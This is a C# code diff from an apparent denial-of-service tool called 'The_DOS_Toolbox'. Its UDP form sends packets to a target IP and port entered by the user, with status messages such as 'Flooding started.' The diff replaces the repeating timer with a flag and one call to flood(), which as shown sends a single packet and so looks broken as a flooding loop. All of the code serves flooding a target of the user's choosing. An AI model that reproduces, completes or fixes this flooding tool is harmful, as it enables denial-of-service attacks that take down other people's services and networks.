@@ -18,6 +18,7 @@ namespace The_DOS_Toolbox
 {
     public partial class UDP : Form
     {
+        public bool active = false;
         public UDP()
         {
             InitializeComponent();
@@ -45,15 +46,15 @@ namespace The_DOS_Toolbox
                 bool internetcon = CheckForInternetConnection(); // this checks the internet connection
                 if (internetcon)
                 {
-                    floodTimer.Interval = Int16.Parse(intervalTxt.Text);
-                    if (floodTimer.Enabled)
+                    if (active)
                     {
                         MessageBox.Show("Flooding is still in progress.");
                     }
                     else
                     {
                         MessageBox.Show("Flooding started.");
-                        floodTimer.Start();
+                        active = true;
+                        flood();
                     }
                 }
                 else
@@ -70,26 +71,29 @@ namespace The_DOS_Toolbox
 
         private void button2_Click(object sender, EventArgs e)
         {
-            floodTimer.Stop();
+            active = false;
         }
 
-        private void floodTimer_Tick(object sender, EventArgs e)
+        private void flood()
         {
-            string ipaddr = ipTxt.Text;
-            int por = Int32.Parse(portTxt.Text);
-            UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
-            try
+            if (active)
             {
-                client.Connect(ipaddr, por); // this is where the fun starts 
-                byte[] sendBytes = Encoding.ASCII.GetBytes(messageTxt.Text);
-                client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
-                client.AllowNatTraversal(true);
-                client.DontFragment = true;
-            }
-            catch
-            {
-                MessageBox.Show("There was an error. Ensure that you have an internet connection and that all the data is entered correctly.");
-                floodTimer.Stop();
+                string ipaddr = ipTxt.Text;
+                int por = Int32.Parse(portTxt.Text);
+                UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
+                try
+                {
+                    client.Connect(ipaddr, por); // this is where the fun starts 
+                    byte[] sendBytes = Encoding.ASCII.GetBytes(messageTxt.Text);
+                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
+                    client.AllowNatTraversal(true);
+                    client.DontFragment = true;
+                }
+                catch
+                {
+                    MessageBox.Show("There was an error. Ensure that you have an internet connection and that all the data is entered correctly.");
+                    active = false;
+                }
             }
         }
     }
